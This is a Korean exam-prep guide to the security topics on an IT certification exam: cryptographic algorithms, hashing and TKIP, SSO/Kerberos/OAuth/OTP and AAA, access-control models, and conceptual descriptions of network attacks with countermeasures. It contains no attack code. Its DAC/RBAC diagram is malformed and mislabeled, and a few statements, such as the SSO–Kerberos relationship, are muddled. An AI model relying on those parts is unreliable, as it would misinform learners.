# 보안
2020-1부터 2026-2까지 21개 회차를 놓고 보면, 보안은 20-3 한 회차를 빼고 매번 1~4문제씩 나왔다. 여기에 VPN·IPSec·L2TP까지 합치면 45문제 안팎이 되는데, 이 셋은 [SW 개발] 페이지의 인터페이스 보안에서 따로 다룬다. 문제 모양은 거의 전부 "설명 2~5줄 → 용어"다. 보기가 없으면 "영문 약어로"라는 조건이 붙는데 ISMS·OAuth·AES·SIEM·OTP가 그랬고, 보기가 있으면 MAC·RBAC·DAC나 웜·트로이 목마·바이러스, 3A처럼 형제 개념 3개를 한 번에 짝짓게 한다. 그리고 재출제가 많다. ISMS와 Watering Hole(22-1 → 26-1), OAuth와 접근 통제(23-3 → 25-3), AES(21-2 → 24-2), 세션 하이재킹(21-1 → 25-1)은 지문까지 거의 같았다.

## 암호 알고리즘 (대칭키·비대칭키)
출제: 24-2, 23-2, 22-2, 21-3, 21-2
형태: 개발 주체·블록 크기·키 길이가 든 설명 2~4줄 → 알고리즘 이름(영문). 대칭/비대칭 방식 자체를 빈칸 2개로 묻기도 함

### 개념
시험에 자주 나오는 암호 알고리즘은 대칭키(DES, SEED, AES), 비대칭키(디피-헬만, RSA, ECC), 해시(MD5, SHA) 세 갈래다. 이 묶음에서는 대칭키와 비대칭키를 보고, 해시와 무선랜 보안 프로토콜은 바로 다음 「해시 함수·무선랜 보안」 묶음에서 이어서 본다. 먼저 용어마다 붙는 키워드를 표로 정리하면 이렇다.

| 용어 | 키워드 |
|---|---|
| **대칭키** | 암호화와 복호화에 같은 키, 비밀키 전달 필요, 빠른 속도, 블록/스트림 암호화 |
| **비대칭키** | 공개키와 개인키 분리, 키 교환 안전, 느린 속도 |
| **DES** | IBM 개발, 56비트 키, 64비트 블록, 현재 취약, 최초 표준 |
| **AES** | NIST 개발, 128/192/256비트 키, 128비트 블록, 널리 사용 |
| **RSA** | 소인수분해 기반, 전자서명 기능, 가장 널리 사용 |
| **IDEA** | 초기 블록 암호화, 128비트 키, 64비트 블록, 8라운드 |
| **Skipjack** | NSA 개발, 음성 암호화, 80비트 키, 64비트 입출력 |

### 대칭키 암호화 알고리즘
**대칭키 암호화**란 암호화할 때와 복호화할 때 같은 키를 쓰는 방식을 말한다. 키가 하나뿐이라 그 키를 어떻게 관리하느냐가 아주 중요하지만, 대신 암호화 속도가 빠르다.

대칭키 암호화는 데이터를 어떤 단위로 잘라 암호화하느냐에 따라 다시 둘로 나뉜다.

- **블록 암호화**: 데이터를 고정 크기 블록으로 나누어 암호화 (DES, AES, SEED, IDEA, Skipjack)
- **스트림 암호화**: 데이터를 비트 단위로 차례차례 암호화 (RC4, ChaCha20 등)

대표 알고리즘 다섯 개를 표로 비교하면 이렇다.

| 알고리즘 | 주요 특징 |
|---|---|
| DES | 최초 표준, IBM 개발, 56비트, 현재 취약 |
| AES | DES 성능 문제 극복, NIST 개발, 128비트, 널리 사용 |
| SEED | 국산 알고리즘, KISA 개발, 128비트, 한국 최초 표준 |
| IDEA | 초기 블록 암호화, 스위스 개발, 128비트 키, 64비트 블록 |
| Skipjack | 음성 암호화, NSA 개발, 80비트 키, 64비트 블록, 전화기 적용 |

#### 1. DES
- 최초의 표준 대칭키 알고리즘
- 키 길이가 짧아 현재는 취약

#### 2. AES
- 현존하는 가장 안전하고 널리 쓰이는 대칭키 알고리즘

#### 3. SEED
- 최초의 국산 대칭키 알고리즘
- 2004년 국가 표준이 된 ARIA와 함께 지금도 국내 표준 블록 암호로 사용

#### 4. IDEA
- 스위스에서 개발한 초기 블록 암호화 알고리즘
- 특허 때문에 사용이 제한적

#### 5. Skipjack
- NSA에서 개발, 주로 음성 암호화에 사용
- 전화기 등에 적용

### 비대칭(공개키) 암호화 알고리즘
**비대칭키 암호화**는 암호화 키와 복호화 키를 따로 나눠 쓰는 방식이다. 둘 중 하나는 모두에게 공개하는 공개키, 다른 하나는 본인만 간직하는 개인키다. 대칭키 방식보다 느리기는 하지만, 키를 안전하게 주고받을 수 있다는 큰 장점이 있다.

| 알고리즘 | 주요 특징 |
|---|---|
| 디피-헬만 | 키 교환, 이산 로그, 최초 공개키 |
| RSA | 소인수분해, 전자서명, 가장 널리 사용 |
| ECC | 타원곡선 이산 로그, 짧은 키, 모바일 유리 |

#### 1. 디피-헬만 (Diffie-Hellman)
- 최초의 공개키 알고리즘
- 이산 로그 문제의 어려움이 기반

#### 2. RSA
- 소인수분해의 어려움이 기반
- 가장 대중적인 비대칭키 알고리즘

#### 3. ECC
- RSA의 대안
- 타원곡선 이산 로그 문제의 어려움이 기반
- 짧은 키 길이로 높은 보안성, 성능 우수, 모바일 환경에 적합

### 기출에서 이렇게 나왔다
- 24-2: DES 한계 극복·NIST·128비트 블록·키 128/192/256 → **AES** (21-2 재출제)
- 23-2: 암호화 방식 설명 → 빈칸 2개 **대칭키 / 비대칭키**
- 22-2: 128비트 키·64비트 블록·8라운드 / NSA·음성·80비트 키 → **IDEA / Skipjack**
- 21-3: IBM·블록 64비트·키 56비트 → **DES**
- 21-2: NIST·128비트 블록·키 128/192/256 → **AES**

### 답 쓸 때
답은 영문 약어로 쓴다. "대칭키"는 "비밀키"로, "비대칭키"는 "공개키"로도 통하지만 지문에 쓰인 쪽을 따른다. 여기서 가장 헷갈리는 게 AES·ARIA·LEA다. 셋 다 128비트 블록에 키 128/192/256으로 숫자가 똑같기 때문이다. 그래서 숫자 말고 다른 단서로 갈라야 하는데, NIST가 나오면 AES, 국내 공동 개발·국가 표준이면 ARIA, 국내 경량·고속이면 LEA다.

## 해시 함수·무선랜 보안 (MD5·SHA·TKIP)
출제: 26-2, 23-2, 22-1, 20-1
형태: 한 줄에서 세 줄 설명 → 용어. 해시는 "해시(함수)" 자체를, MD5·TKIP는 약어를 쓰게 함

### 개념
앞 묶음의 대칭키·비대칭키에 이어, 여기서는 해시 알고리즘과 무선랜 보안 프로토콜을 본다. 용어별 키워드부터 정리하면 이렇다.

| 용어 | 키워드 |
|---|---|
| **해시 함수** | 단방향 함수, 고정 길이 해시값, 복호화 불가 |
| **MD5** | RFC 1321, 128비트 해시값, MD4 대체, 현재 충돌 취약 |
| **TKIP** | WEP 보완, 패킷별 키 믹싱, MIC 적용, 무선랜 보안 프로토콜 |

### 해시 암호화 알고리즘
해시 알고리즘은 길이가 제각각인 데이터를 고정된 길이의 해시값으로 바꾸는 단방향 함수다. 되돌려 복호화할 수 없기 때문에 주로 데이터 무결성을 검증하거나 패스워드를 저장할 때 쓴다.

#### 해시 함수 (Hash Function)
**해시 함수**란 임의 길이의 데이터를 고정 길이의 해시값으로 변환하는 함수를 말한다. 특징은 세 가지다.

- **단방향 함수**: 복호화 불가
- **충돌 저항**: 서로 다른 입력에서 같은 해시값이 나오지 않음
- **고정 길이**: 아무리 큰 값을 넣어도 해시값 길이는 일정

주요 해시 알고리즘 셋을 비교하면 이렇다.

| 알고리즘 | 주요 특징 |
|---|---|
| MD5 | 128비트, 충돌 취약, 사용 금지 |
| SHA-1 | 160비트, 충돌 취약, 사용 중단 |
| SHA-2 | 256/384/512비트, 안전, 널리 사용 |

#### MD5
- RFC 1321로 정의된 128비트 해시 함수
- MD4를 대체하려고 만들어짐
- 파일 무결성 검사에 널리 쓰였으나 지금은 충돌 취약점 때문에 보안 용도로 부적합

#### SHA-1
- 160비트 해시값 생성
- 충돌 취약점이 발견되어 사용 중단 추세

#### SHA-2 계열 (SHA-256 등)
- AES의 키 길이에 대응하는 해시 알고리즘
- 현재 보안 표준으로 가장 널리 쓰이는 안전한 해시

### 무선랜 보안 프로토콜
무선랜 보안 프로토콜은 무선 구간을 오가는 데이터를 암호화하고, 패킷이 중간에 위조·변조되지 않았는지 확인하는 일을 한다. 암호 알고리즘과 함께 나올 때는 세 가지로 구분하면 된다. 어떤 취약점을 보완했는지, 키를 어떻게 관리하는지, 무결성 검사를 하는지다.

#### TKIP
**TKIP(Temporal Key Integrity Protocol)**는 WEP의 취약점을 보완하려고 IEEE 802.11i 표준의 일부로 설계된 무선랜 보안 프로토콜이다. 우리말로는 **임시 키 무결성 프로토콜**이라고 부른다. 핵심은 두 가지다.

- **키 믹싱**: 패킷마다 키를 동적으로 변경, WEP처럼 같은 키 흐름이 반복되는 문제 감소
- **MIC(Message Integrity Check)**: 메시지 무결성 검사로 패킷 위조·변조 탐지

WEP는 초기 무선랜 보안 방식인데, 키를 재사용하고 무결성 검증이 약해서 취약하다. TKIP는 기존 장비와의 호환성을 고려해 이 WEP를 보완한 과도기 방식이고, 그 뒤로는 AES 기반의 CCMP가 더 강한 보안 방식으로 쓰인다.

### 기출에서 이렇게 나왔다
- 26-2: 무결성 검증·제산법·단방향 설명 3줄 → **해시**
- 23-2: 임의 길이를 고정 길이로, 단방향 한 줄 → **해시 함수**
- 22-1: WEP 보완·802.11i·임시 키 무결성 → **TKIP**
- 20-1: RFC 1321·MD4 대체·128비트 → **MD5**

### 답 쓸 때
정답은 "해시"로도, "해시 함수"로도 쓰였다. 26-2 지문에는 자료구조 해싱에 나오는 "제산법"이 섞여 있었는데, 자료구조 문제인가 싶어 당황할 필요는 없다. TKIP는 영문 약자로 쓴다.

## 인증 기술·3A (OAuth·OTP·SSO·Kerberos·JWT)
출제: 25-3, 23-3, 22-3, 21-3
형태: 설명 2~4줄 → 영문 약어. 25-3은 OTP와 OAuth가 각각 한 문제. 3A는 설명 3개 → 영어 단어 3개

### 개념
이 묶음은 두 부분으로 나뉜다. 앞에서는 SSO, Kerberos, OAuth, OTP 네 가지 인증 기술의 개념과 차이를 보고, 뒤에서는 정보 보안의 세 요소인 3A(인증·권한 부여·계정 관리)를 본다.

### 인증 기술 비교표
네 기술을 한 표에 놓으면 이렇다. 여기서 눈여겨볼 칸은 주요 목적이다. 나머지 셋은 인증인데 OAuth만 권한 부여다.

| 구분 | SSO | Kerberos | OAuth | OTP |
|---|---|---|---|---|
| 주요 목적 | 인증 (Authentication) | 인증 (Authentication) | 권한 부여 (Authorization) | 인증 (Authentication) |
| 핵심 개념 | 한 번 로그인으로 여러 서비스 이용 | 티켓 기반 상호 인증 | 비밀번호 없이 권한 위임 | 일회용 비밀번호 |
| 사용 환경 | 기업 내부, 클라우드 | 내부 네트워크 (AD 등) | 소셜 로그인, API 접근 | 금융권, 2차 인증 |
| 보안 방식 | SAML, JWT 토큰 | 대칭키 암호화, 티켓 | Access Token | 해시함수 기반 |

#### 1. SSO (Single Sign-On)
**SSO**란 한 번 인증하면 여러 서비스에 자동으로 접속할 수 있게 해 주는 시스템이다.

- 구성: 중앙 인증 서버(IdP)에서 인증 → 토큰 발급 → 다른 서비스(SP)에 추가 로그인 없이 접근
- 구현 기술: SAML, JWT, Kerberos 등
- 특징: Kerberos의 핵심 기술로도 사용

#### 2. Kerberos
**Kerberos**는 티켓을 바탕으로 사용자와 서버가 서로를 인증하는 프로토콜이다. 구성 요소는 셋이다.

| 구성 요소 | 설명 |
|---|---|
| KDC | Key Distribution Center, 키 분배 센터 (AS + TGS) |
| AS | Authentication Server, 사용자 인증 후 TGT 발급 |
| TGS | Ticket Granting Server, TGT 확인 후 서비스 티켓(ST) 발급 |

동작은 사용자가 AS에서 TGT를 받고, 그 TGT를 TGS에 보여 서비스 티켓(ST)을 받은 다음, ST로 서비스에 접근하는 순서다.

- 특징: 대칭키 암호화 사용, SSO 지원, 시간 동기화 필요

#### 3. OAuth
**OAuth**는 비밀번호를 넘기지 않고 접근 권한을 위임하는 개방형 표준 프로토콜이다. 등장하는 용어는 넷이다.

| 용어 | 설명 |
|---|---|
| Resource Owner | 사용자 (자원 소유자) |
| Client | 제3자 애플리케이션 |
| Resource Server | 자원이 저장된 서버 (예: 구글) |
| Authorization Server | Access Token 발급 서버 |

- 사용 예시: '구글 계정으로 로그인하기'
- 특징: 비밀번호 노출 없음, 권한 범위를 골라서 위임 가능

#### 4. OTP (One-Time Password)
**OTP**는 한 번만 쓸 수 있는 일회용 비밀번호다. 새 비밀번호를 만드는 기준에 따라 두 방식이 있다.

| 방식 | 설명 |
|---|---|
| TOTP | 시간 동기화 방식, 일정 시간(30~60초)마다 새 비밀번호 생성 |
| HOTP | 이벤트 동기화 방식, 인증 요청 횟수(카운터) 기반 |

- 기술적 특징: 단방향 해시함수 사용, 유효 시간 제한
- 장점: 탈취되어도 재사용 불가, 패턴 유추 어려움

### 3A 비교 요약
**3A** 또는 AAA는 정보 보안의 핵심 세 요소인 인증(Authentication), 권한 부여(Authorization), 계정 관리(Accounting)의 머리글자다. 사용자가 시스템에 들어와 작업을 마칠 때까지 전 과정에 걸쳐 보안을 지키는 데 셋 다 꼭 필요하다. 셋을 먼저 표로 비교하면 이렇다.

| 구분 | 인증 (Authentication) | 권한 부여 (Authorization) | 계정 관리 (Accounting) |
|---|---|---|---|
| 핵심 질문 | 당신은 누구인가? | 무엇을 할 수 있는가? | 무엇을 했는가? |
| 목표 | 신원 확인 | 접근 제어 | 활동 기록 및 책임 추적 |
| 주요 기술 | 비밀번호, OTP, 생체 인식 | 접근 통제 목록(ACL), RBAC, DAC, MAC | 로그 파일, 시스템 모니터링, SIEM |
| 순서 | 1단계 (가장 먼저 수행) | 2단계 (인증 후 수행) | 3단계 (접속 내내 지속) |
| 비유 | 공항 탑승 수속 (신분 확인) | 비행기 좌석 등급 (권한 확인) | 출입국 기록 및 면세점 구매 내역 |

표의 비유 칸처럼 공항 보안 검색대를 지나는 과정에 대 보면 쉽다.

- 인증: "당신이 누구인지 증명하세요" (신분증과 탑승권 확인)
- 권한 부여: "당신이 할 수 있는 일은 여기까지입니다" (비즈니스석 티켓이 있으면 비즈니스 라운지 이용 가능)
- 계정 관리: "당신이 한 모든 일을 기록합니다" (면세점 구매 내역, 출입국 기록)

인증과 권한 부여는 영어가 비슷해서 헷갈리는데, 외우는 말이 하나 있다. "어쎈 인증, 어떠한 권한 부여?" Authen(tication)은 "어쎈" 인증, Author(ization)은 "어떠한" 권한 부여다.

세 요소는 정해진 순서대로 돌아간다. 먼저 사용자 신원을 확인하고(Authentication), 인증된 사용자에게 알맞은 권한을 주고(Authorization), 그 뒤로 사용자의 모든 활동을 계속 기록한다(Accounting). 이 순서는 절대 바뀌지 않고, 앞 단계를 통과해야 다음 단계로 넘어간다.

#### Authentication (인증)
**인증**이란 사용자가 주장하는 신원(Identity)이 실제로 맞는지 확인하는 과정이다. 쉽게 말해 "로그인" 과정 그 자체라고 보면 된다.

- 핵심 질문: "당신이 정말 'user123'이 맞나요?"
- 목표: 시스템에 접근하려는 주체(사용자, 기기 등)의 신원 검증
- 정의: 접근을 시도하는 가입자 또는 단말에 대한 식별 및 검증 과정

인증 방법은 무엇을 근거로 확인하느냐에 따라 다섯 가지다.

| 인증 요소 | 예 |
|---|---|
| 지식 기반 (Something you know) | 비밀번호, PIN 번호 |
| 소유 기반 (Something you have) | OTP, 스마트카드, 공인인증서 |
| 특성 기반 (Something you are) | 지문, 홍채, 얼굴 인식 (생체 정보) |
| 행위 기반 (Something you do) | 서명, 걸음걸이 |
| 위치 기반 (Somewhere you are) | 특정 IP 주소, GPS 위치 |

이 다섯 가지 중 두 가지 이상을 조합해 보안을 강화하는 것을 **다중 인증(MFA, Multi-Factor Authentication)**이라고 한다. 비밀번호(지식)를 입력한 뒤 OTP(소유)로 한 번 더 확인하는 것이 대표적인 예다.

#### Authorization (권한 부여)
**권한 부여**는 인증을 통과한 사용자가 시스템 안에서 어떤 자원(파일, 데이터베이스 등)에 접근할 수 있고, 어떤 작업(읽기, 쓰기, 삭제 등)을 할 수 있는지 결정하고 허용하는 과정이다.

- 핵심 질문: "'user123'님, 이 파일에 '쓰기' 작업을 할 수 있나요?"
- 목표: 인증된 사용자가 허가된 범위 안에서만 활동하도록 통제
- 정의: 검증된 가입자나 단말에게 어떤 수준의 권한과 서비스를 허용할지 결정하는 과정

주요 모델은 셋이고, 자세한 내용은 다음 「접근 통제」 묶음에서 본다.

- **임의적 접근 통제(DAC)**: 데이터 소유자가 직접 권한 관리 (예: 리눅스 chmod)
- **강제적 접근 통제(MAC)**: 시스템이 정한 보안 등급과 규칙에 따라 접근 강제 (예: 군사 시스템)
- **역할 기반 접근 통제(RBAC)**: 사용자에게 할당된 '역할'에 따라 권한 부여 (대부분의 기업 환경)

인증과 권한 부여의 차이를 문에 빗대면 이렇다. 인증은 '문'을 열고 들어가는 과정이고, 권한 부여는 문 안으로 들어온 뒤 특정 '방'에 들어가거나 '금고'를 열 수 있는지 정하는 과정이다. 그래서 인증이 먼저 되어야 권한 부여도 의미가 있다.

#### Accounting (계정 관리)
**계정 관리**는 사용자가 시스템에 접속해서 한 모든 활동을 기록하고 추적하는 과정이다. 누가, 언제, 어떤 자원에 접근해 무슨 작업을 했는지 로그(Log)를 남겨 두고, 문제가 생겼을 때 원인을 파악하고 책임을 추적하는 데 쓴다. Auditing이라고도 한다.

- 핵심 질문: "'user123'님, 어제 오후 3시에 어떤 파일을 삭제했나요?"
- 목표: 모든 활동을 기록해 책임 추적성(Accountability) 확보, 보안 감사 지원
- 정의: 리소스 사용에 대한 정보를 수집하고 관리하는 서비스
- 주요 기록 항목: 접속·로그아웃 시간, 접근한 IP 주소, 사용한 명령어와 시스템 콜, 파일 접근·변경 이력, 사용한 시스템 자원(CPU, 메모리 등)

### 기출에서 이렇게 나왔다
- 25-3: 설명 → 영어 약어 **OTP**. 다른 문제에서 설명 4줄 → 보기 **OAuth** (23-3 재출제)
- 23-3: 설명 2줄 → **OAuth**
- 22-3: 커버로스·한 번 인증으로 여러 자원 한 줄 → **SSO**
- 21-3: 설명 3개 → 영어 **Authentication / Authorization / Accounting**

### 답 쓸 때
3A는 약어가 아니라 영어 단어 전체를 쓴다. 여기서 많이들 헷갈리는 게 Authentication(인증)과 Authorization(인가)인데, 둘을 바꿔 쓰지 않도록 조심한다. 그리고 OAuth는 O와 A가 대문자다.

## 접근 통제 (DAC·MAC·RBAC)
출제: 25-3, 23-3, 21-1
형태: 설명 3개 → 영어 약어 3개(25-3, 23-3). 21-1은 한 줄 → DAC 하나

### 개념
**서버 접근 통제(Access Control)**란 간단히 말해 '누가, 무엇을, 어떻게 할 수 있는가'를 정하고 그대로 지키게 하는, 보안에서 가장 기본이 되는 원칙이다. 허가된 사용자는 필요한 정보와 기능에 접근하게 하고 비인가자는 막아서, 시스템의 기밀성·무결성·가용성을 보장한다.

접근 통제를 구현하는 모델은 여러 가지인데, 가장 대표적인 것이 DAC, MAC, RBAC 셋이다. 먼저 표로 비교하면 이렇다.

| 구분 | 임의적 접근 통제 (DAC) | 강제적 접근 통제 (MAC) | 역할 기반 접근 통제 (RBAC) |
|---|---|---|---|
| 통제 주체 | 객체 소유자 (신분/Identity 기반) | 시스템 (관리자 정책) | 역할 (관리자 정책) |
| 권한 설정 | 소유자 임의로 설정 | 보안 등급 및 규칙 | 역할에 할당된 권한 |
| 유연성 | 높음 | 낮음 | 중간 |
| 보안 수준 | 낮음 | 매우 높음 | 높음 |
| 관리 복잡도 | 낮음 | 매우 높음 | 중간 |
| 주요 사용처 | 개인용 컴퓨터, 소규모 시스템 | 군사, 정부, 높은 보안 요구 시스템 | 대부분의 기업, 클라우드 환경 |

### 접근 통제 모델 하나씩 보기

#### 1. DAC (Discretionary Access Control)
**임의적 접근 통제(DAC)**는 데이터나 객체(파일, 디렉토리 등)의 소유자가 자기 판단으로 다른 사용자에게 접근 권한을 주거나 제한하는 방식이다. 우리에게 가장 친숙한 모델이기도 하다. 소유자가 사용자 개개인의 ID(신분)에 권한을 주기 때문에 **신분 기반(Identity-Based) 접근 통제**라고도 부른다. 뒤에 나오는 MAC, RBAC와 달리 사용자 한 명 한 명에게 권한을 준다는 점이 특징이다.

- 핵심 특징: 객체 소유자가 접근 권한 관리
- 장점: 소유자가 자율적으로 관리해 편리하고 유연함(유연성), 중앙 관리자 없이 설정 가능해 소규모 시스템에 적합(간편함)
- 단점: 악의적 사용자가 권한을 얻으면 다른 사용자에게 쉽게 넘겨줄 수 있음(보안 취약성, 예: 트로이 목마 공격에 취약), 조직 전체 보안 정책을 일관되게 적용하기 어려움(중앙 관리의 어려움)

대표적인 예는 둘이다. 하나는 UNIX/Linux 파일 권한으로, 파일 소유자가 `chmod` 명령으로 다른 사용자(Owner, Group, Other)에게 읽기(r), 쓰기(w), 실행(x) 권한을 정하는 것이다. 다른 하나는 윈도우 파일 공유로, 폴더 속성에서 특정 사용자에게 공유 권한을 주는 것도 DAC에 해당한다.

#### 2. MAC (Mandatory Access Control)
**강제적 접근 통제(MAC)**는 DAC와 달리 시스템 관리자가 미리 정해 둔 엄격한 보안 정책(규칙)에 따라 모든 접근을 강제하는 방식이다. 사용자의 의사와 상관없이 시스템이 접근을 통제한다.

- 핵심 특징: 시스템 전체에 적용되는 보안 정책과 보안 등급(Security Level) 기반 통제
- 장점: 중앙 통제 정책으로 정보 유출을 효과적으로 방지, 매우 높은 수준의 보안(강력한 보안), 조직 전체에 일관된 정책 강제(일관성)
- 단점: 설정·관리가 매우 복잡하고 정해진 정책 변경이 어려움(복잡성 및 비유연성), 모든 객체와 주체에 보안 등급을 할당·관리해야 해서 비용이 큼(관리 비용)

예로는 리눅스 커널에 MAC을 구현한 보안 모듈 SELinux(Security-Enhanced Linux)가 있다. 모든 프로세스와 파일에 보안 레이블을 붙여 접근을 통제한다. 군사·정부 시스템도 마찬가지인데, '기밀', '대외비' 같은 보안 등급을 사용자(보안 허가)와 정보(보안 등급)에 매겨 두고, 자기 허가 수준보다 높은 등급의 정보에는 접근하지 못하게 한다.

#### 3. RBAC (Role-Based Access Control)
**역할 기반 접근 통제(RBAC)**는 사용자 자체가 아니라 사용자가 속한 '역할(Role)'을 기준으로 접근 권한을 주는 방식이다. 오늘날 대부분의 기업 환경에서 쓰는 표준 접근 통제 모델이다.

- 핵심 특징: '사용자 - 역할 - 권한' 관계로 접근 제어 (User → Role → Permission)
- 장점: 입사·퇴사·부서 이동 때 권한을 다시 설정할 필요 없이 역할만 부여·회수(관리 효율성, 관리 확장성), 역할에 꼭 필요한 권한만 주어 최소 권한 원칙(Principle of Least Privilege) 구현이 쉬움, 조직 정책을 일관되게 적용(정책의 일관성)
- 단점: 직무와 책임을 분석해 역할을 설계하는 데 시간과 노력이 듦(초기 설계의 복잡성), 역할이 너무 잘게 나뉘거나 많아지면 오히려 관리가 복잡해짐(역할 폭발, Role Explosion)

예를 들어 AWS IAM(Identity and Access Management)에서는 개발자, 관리자, 재무팀 같은 역할(Role)을 만들고 역할마다 필요한 권한(Policy)을 붙인다. 사용자는 그 역할을 부여받아 권한을 쓴다. 데이터베이스 관리 시스템도 DBA, Developer, User 같은 역할을 정해 두고, 역할별로 테이블에 SELECT, INSERT, DELETE 등을 할 수 있는 권한을 준다.

여기서 시험 함정이 하나 있다. 이름이 비슷한 **신분 기반(DAC)**과 **역할 기반(RBAC)**이다. 신분 기반은 개인(사용자 ID)에게 직접 권한을 주고, 역할 기반은 '부장'·'개발자' 같은 직책(역할) 단위로 권한을 묶어 둔 뒤 사용자가 그 역할을 받아서 쓴다. 단어는 비슷해도 통제 주체가 '개인 신분'이냐 '역할'이냐로 완전히 다르다. 그림으로 나란히 놓으면 이 차이가 바로 보인다.

```mermaid

flowchart LR
  subgraph R["RBAC: 역할 소유·양도 가능"]
    direction LR
    RB1("부장 역할") --> RK1("권한")

    RU2("사용자") -.->|"역할 부여"| RB2
  end
  subgraph D["DAC: 개인 소유"]
    direction LR
    DU1("사용자 ID 1") --> DK1("권한")
    DU2("사용자 ID 2") --> DK2("권한")
```

## 네트워크 공격 (스푸핑·스니핑·세션 하이재킹)
출제: 25-1, 21-3, 21-1, 20-4
형태: 설명 2~3줄 → 보기에서 고르기, 또는 "( ) Spoofing" 빈칸

### 개념
네트워크 공격은 비밀번호를 알아내는 패스워드 크래킹부터 IP·ARP 스푸핑, 스니핑, 중간자 공격(MITM), 재전송 공격(Replay Attack)까지 종류가 많다. 용어마다 붙는 키워드를 먼저 정리하면 이렇다.

| 용어 | 키워드 |
|---|---|
| 사전 크래킹 | 사전 단어 순차 대입, 빠른 공격 속도, 단순 비밀번호 취약 |
| 무차별 크래킹 | 모든 문자 조합 시도, 시간 오래 걸림, 확실한 방법 |
| 레인보우 테이블 공격 | 미리 계산된 해시값 테이블, 빠른 해독, 솔트로 방어 |
| ARP 스푸핑 | MAC 주소 변경, 패킷 가로채기, 중간자 공격 |
| 스니핑 | 네트워크 패킷 엿보기, 암호화되지 않은 데이터 취약, 수동적 공격 |
| 세션 하이재킹 | 세션 가로채기, TCP 3-way handshake 완료 후, 인증 우회, 세션 관리 취약점 |
| 중간자 공격 (MITM) | 두 당사자 사이에 끼어들어 도청·변조, ARP 스푸핑·DNS 스푸핑·가짜 AP |
| 재전송 공격 (Replay) | 정상 패킷을 가로채 그대로 다시 전송, 타임스탬프·Nonce·시퀀스로 방어 |

이 공격들을 갈래별로 묶으면 다음과 같다. 아래 소제목도 이 순서대로 간다.

| 구분 | 공격 기법 |
|---|---|
| 패스워드 크래킹 | 사전 크래킹, 무차별 크래킹, 패스워드 하이브리드 공격, 레인보우 테이블 공격 |
| 스푸핑 | IP 스푸핑, ARP 스푸핑 |
| 스니핑 | 스니핑, 네트워크 스캐너/스니퍼 |
| 중간자 공격 | MITM (ARP 스푸핑·DNS 스푸핑·가짜 AP를 수단으로 활용) |
| 이외 네트워크 공격 | ICMP Redirect 공격, 세션 하이재킹, 재전송 공격(Replay Attack) |

### 패스워드 크래킹 (Password Cracking)
**패스워드 크래킹**이란 시스템에 저장된 비밀번호를 알아내는 데 쓰는 모든 기술을 말한다. 기법은 여러 가지인데 대표적인 것은 넷이다.

#### 사전 크래킹 (Dictionary Attack)
사전에 있는 단어, 사람들이 자주 쓰는 단어, 유출된 비밀번호 목록 같은 것을 대입해서 비밀번호를 알아내는 방법이다. 가장 기본적인 공격이지만 비밀번호가 단순하면 아주 잘 통한다.

- 원리: 미리 만들어 둔 단어 목록(사전)을 순서대로 대입
- 특징: 공격 속도가 빠름
- 대응책: 사전에 없는 단어, 특수문자·숫자·대소문자를 조합한 복잡한 비밀번호 사용

#### 무차별 크래킹 (Brute-force Attack)
이름 그대로 가능한 문자 조합을 하나씩 전부 대입해 보는, 말하자면 무식한 방법이다.

- 원리: a, b, c... aa, ab, ac...처럼 가능한 모든 조합 시도
- 특징: 시간이 매우 오래 걸리지만 언젠가는 반드시 비밀번호를 찾아냄
- 대응책: 계정 잠금(Login Lock) 정책 설정 (예: 5회 실패 시 10분간 잠금), 비밀번호 길이 늘리기

#### 패스워드 하이브리드 공격 (Hybrid Attack)
사전 공격과 무차별 공격을 합친 형태다. 예를 들어 사전 단어 `password`에 숫자 `123`이나 특수문자 `!`를 붙여 `password123`, `password!`처럼 만들어 대입한다.

- 원리: 사전 단어 + 숫자/특수문자 조합
- 특징: 단순한 사전 공격보다 성공률이 높음
- 대응책: 예측하기 어려운 단어와 숫자/기호 조합 사용

#### 레인보우 테이블 공격 (Rainbow Table Attack)
레인보우 테이블은 미리 계산해 둔 해시값들을 체인으로 엮은 거대한 테이블이다. 시스템에서 비밀번호 해시값을 빼냈을 때 이 테이블을 쓰면 원래 비밀번호를 아주 빠르게 찾아낼 수 있다.

- 원리: 해시 함수를 거꾸로 추적하려고 미리 만들어 둔 해시값 테이블(레인보우 테이블) 사용
- 특징: 해시값만 알면 매우 빠르게 원본 값을 찾음
- 대응책: 솔트(Salt) 사용. 원본 비밀번호에 임의의 문자열(Salt)을 덧붙여 해싱하면 레인보우 테이블이 무력화됨

### 스푸핑 (Spoofing)
**스푸핑**은 '속이다'라는 뜻 그대로, 공격자가 자기 신원을 위장해서 시스템에 접근하거나 정보를 빼내는 공격 기법이다.

#### IP 스푸핑 (IP Spoofing)
패킷의 출발지 IP 주소를 신뢰받는 다른 컴퓨터의 IP 주소로 위조해서 공격하는 방식이다. DoS 공격이나 방화벽 우회 등에 쓰인다.

#### ARP 스푸핑 (ARP Spoofing)
내부 네트워크(LAN)에서 쓰는 ARP 프로토콜의 허점을 노린 공격이다. 공격자는 특정 IP 주소에 대응하는 MAC 주소(물리적 주소)를 자기 것인 양 속여서, 네트워크의 통신 내용을 중간에서 모두 가로챈다(Man-in-the-Middle Attack).

### 스니핑, 스니퍼, 네트워크 스캐너

#### 스니핑 (Sniffing)
'킁킁거리며 냄새를 맡다'라는 뜻처럼, 네트워크를 지나다니는 데이터 패킷을 몰래 엿보는 행위 자체를 말한다. 암호화되지 않은 데이터(ID, 비밀번호 등)는 스니핑에 아주 취약하다.

#### 네트워크 스캐너 (Network Scanner), 스니퍼 (Sniffer)
네트워크에 연결된 시스템들의 IP 주소, 열려 있는 포트, 실행 중인 서비스 등을 확인하는 데 쓰는 도구다. 공격자는 이걸로 공격 대상의 취약점을 파악하고, 관리자는 보안 상태를 점검하는 데 쓴다.

### 중간자 공격 (MITM, Man-In-The-Middle Attack)
**중간자 공격**은 통신하는 두 당사자 사이에 공격자가 끼어들어, 오가는 데이터를 도청하거나 변조하는 공격이다. 피해자 A와 B는 서로 직접 통신한다고 믿지만 실제 경로는 A ↔ 공격자 ↔ B다.

- 원리: 통신 경로 중간에 공격자가 자리 잡고 패킷을 가로챈 뒤, 필요하면 내용을 바꿔 상대에게 다시 전송
- 특징: 두 당사자 모두 정상 통신 중이라 눈치채기 어려움 (스니핑은 엿보기만, MITM은 변조까지 가능)

MITM을 실현하는 대표 수단은 넷이다.

| 수단 | 동작 방식 |
|---|---|
| ARP 스푸핑 | 같은 LAN 안에서 MAC 주소를 위조해 패킷을 공격자에게 유도 (앞 소제목 참고) |
| DNS 스푸핑 | DNS 응답을 위조해 피해자가 가짜 사이트에 접속하도록 유도 |
